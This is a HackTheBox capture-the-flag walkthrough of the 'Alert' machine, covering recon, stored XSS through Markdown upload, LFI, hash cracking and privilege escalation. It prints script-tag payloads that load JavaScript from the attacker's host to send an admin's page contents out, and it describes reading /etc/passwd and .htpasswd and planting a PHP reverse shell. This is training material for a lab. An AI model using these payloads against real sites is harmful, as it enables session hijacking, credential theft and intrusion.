+++ 
draft = false
date = 2025-01-06T17:08:18+01:00
title = "HackTheBox Alert Writeup"
description = "A walkthrough for the HTB \"Alert\" machine"
slug = ""
authors = ["Raul Bulgariu Suciu"]
tags = ["Tutorial", "Hacking", "HTB"]
categories = []
externalLink = ""
series = []
+++

{{<betterfigure src="files/title.png" alt="Title card">}}

Happy new year and welcome to another HackTheBox writeup, today we'll be focusing on the HTB Machine "Alert", let's begin:

# Basic reconnaissance

{{<betterfigure src="files/scan.png" alt="Nmap scan">}}

Same story as always, our target box has the HTTP and SSH ports open.
Add the domain name to your `/etc/hosts` file and let's take a look inside.

# Gaining a foothold

{{<betterfigure src="files/web.png" alt="Website">}}

We can immediately tell what the website's all about, we can upload **Markdown** files and render them in the browser. Pretty neat.

The developers seem to be proud of their administrator for responding to any messages sent via the "Contact Us" section, sounds interesting but we should focus now on the Markdown rendering for now.

## Sanitized user input? Never heard of it!

Since the whole point of the website is all about rendering Markdown let's write some text for it to process:
 
{{<betterfigure src="files/marktest.png" alt="Markdown test 1">}}

{{<betterfigure src="files/marktest1.png" alt="Markdown test 2">}}

Now you might be thinking about trying to look for any CVEs related to Markdown rendering software, but you'll most likely come up empty-handed.

So, how do we even try to attack a website using nothing but Markdown? Well, if you're familiar with Markdown, there's a chance you've used inline HTML tags in the past, so let's try something new...

{{<betterfigure src="files/alert.png" alt="XSS">}}

{{<betterfigure src="files/alert1.png" alt="XSS">}}

Bingo, it seems like the Markdown renderer isn't checking for potentially dangerous user input such as `<script>` tags, which means we can execute XSS attacks, on who though? Locally-ran Javascript isn't going to help us gain remote access to the server.

## Gullible admins

So far we've managed to find an XSS vulnerability, but there's nothing we can do with it at least when executing JS code in our own machine. Though you may remember a previous line from this article:

> The developers seem to be proud of their administrator for responding to any messages sent via the "Contact Us" section, sounds interesting but we should focus on the Markdown rendering for now.

Let's try sending over a Markdown file trying to source a .js file from our attacking machine with the following code:

```md
# Hello
## Hello
### Hello

* Item 1
* Item 2
* Item 3

<script src=http://10.10.16.33:8000/somefile></script>
```

We upload the new Markdown file, open our HTTP server and send the link via the contact form:

{{<betterfigure src="files/gullible.png" alt="Gullible admins">}}

And bingo! The admin actually opened the link as you can see from the HTTP server requests.

## Where do we go now?

We've tested that we can send XSS payloads to the admins and they'll execute them, though how can we exfiltrate any useful information using this method?

Thanks to [the following repository](https://github.com/hoodoer/XSS-Data-Exfil), we can easily have the victim request a page from the site and send its base64-encoded contents via GET request to our web-server.

All we need to do is have the client source the modified exfilPayload.js file with the proper parameters and the requested web page will show up as a Base64 string requested from our web-server.

{{<betterfigure src="files/exfilpayload.png">}}

For this example, let's try requesting the root page for the machine from the admin account by modifying the code earlier shown.

```md
# Hello
## Hello
### Hello

* Item 1
* Item 2
* Item 3

<script src=http://10.10.16.33/exfilPayload.js></script>
```

{{<betterfigure src="files/baseacquired.png">}}

As you can see, we've received a base64-encoded string in our HTTP server, let's try decoding it!

{{<betterfigure src="files/decoded.png">}}

The XSS payload worked, we managed to request the targeted page using the admin's permissions, and if you were paying attention, you might notice an extra navigation bar button aside from "Markdown Viewer", "Contact Us", "About Us" and "Donate"...

Let's try requesting it and see what we can find:

{{<betterfigure src="files/messages.png">}}

It seems that there's a message available for the admin, however, if we try to request that specific file, it'll won't return anything actually useful.

However, you might have noticed that instead of requesting a page, it's requesting a specific file from the server, so let's see if we can fiddle with this parameter:

## Accessing the filesystem

Let's see if we can try to go back in the filesystem tree and access the /etc/passwd file...

{{<betterfigure src="files/passwdjs.png">}}

{{<betterfigure src="files/passwdacquired.png">}}

And bingo! It worked, there seem to be two available users apart from root in the server. This confirms that we have full LFI access to the server and can try requesting any file from it, so let's see if we can find any credentials now.

> One of the most effective ways to go about exploiting LFI vulnerabilities is by checking for common configuration file paths such as for example Apache config files like `/etc/apache2/apache2.conf`

{{<betterfigure src="files/pullapache.png">}}

{{<betterfigure src="files/apacheconfig.png">}}

If you kept trying different configuration files, you might have been able to stumble into the correct one containing the VirtualHost information for the alert.htb domains, and with it you'll have realized that there was also another domain this entire time, one called "statistics.alert.htb"

As the configuration file is indicating, if you tried to access this domain, you would be prompted to provide credentials contained in a file at `/var/www/statistics.alert.htb/.htpasswd`, so let's try downloading that file!

{{<betterfigure src="files/pullcredentials.png">}}

{{<betterfigure src="files/htpasswd.png">}}

We successfully downloaded the credentials file, so let's try to crack it using John The Ripper, we naturally use the rockyou.txt wordlist for it, while specifying the "md5crypt-long" format at the same time.

{{<betterfigure src="files/albertpass.png">}}

You might now be thinking about using the credentials in the protected apache service, but do you remember the users we saw after downloading the `/etc/passwd` file? One of them has the same name as the one from the credentials file, and since people tend to reuse passwords it's worth giving SSH a shot now:

{{<betterfigure src="files/userflag.png">}}

The credentials do indeed work! And now we have finally gained access to the user.txt flag.

# Privilege escalation

While exploring the box, you might check the currently open ports and find port 8080 on localhost currently available:

{{<betterfigure src="files/localhost.png">}}

Upon further inspection by using SSH forwarding to access the port from your own machine, you'll find out that it's a website monitor integrated into the server.

{{<betterfigure src="files/monitor.png">}}

If we try and find the original source code powering this service, we'll come across these folders, although you may notice a special group with full write permissions in one of the folders, with our user just so happening to be in that group!

{{<betterfigure src="files/webconfig.png">}}

Another thing that you'll notice is that the index.php file seems to be importing a php file from that same folder we have permissions in, so let's try to reverse shell our way to root!

{{<betterfigure src="files/index.png">}}

All you have to do is replace the contents of the configuration file with a php reverse shell while keeping your netcat port open, and soon after you'll get a shell with access to the root flag:

{{<betterfigure src="files/root.png">}}
